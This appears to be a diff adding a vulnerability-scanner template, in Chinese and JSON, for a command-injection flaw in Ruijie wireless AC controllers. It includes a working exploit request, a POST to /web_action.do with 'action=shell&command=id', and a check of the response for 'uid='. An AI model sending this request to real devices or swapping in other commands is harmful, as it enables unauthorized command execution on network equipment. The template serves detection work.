@@ -1,0 +1,36 @@
+{
+  "product": "锐捷网络无线AC",
+  "vul_name": "锐捷网络无线AC web_action.do命令执行",
+  "type": "命令执行",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "锐捷无线AC产品RG-WS6008、RG-WS6108存在命令注入漏洞，攻击者在获取设备登陆管理权限的前提下，可向web系统的某管理接口注入命令执行。",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://github.com/wy876/POC/blob/main/%E9%94%90%E6%8D%B7%E7%BD%91%E7%BB%9C%E6%97%A0%E7%BA%BFAC%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/web_action.do",
+      "data": "action=shell&command=id"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "uid="
+        }
+      ]
+    }
+  }
+}
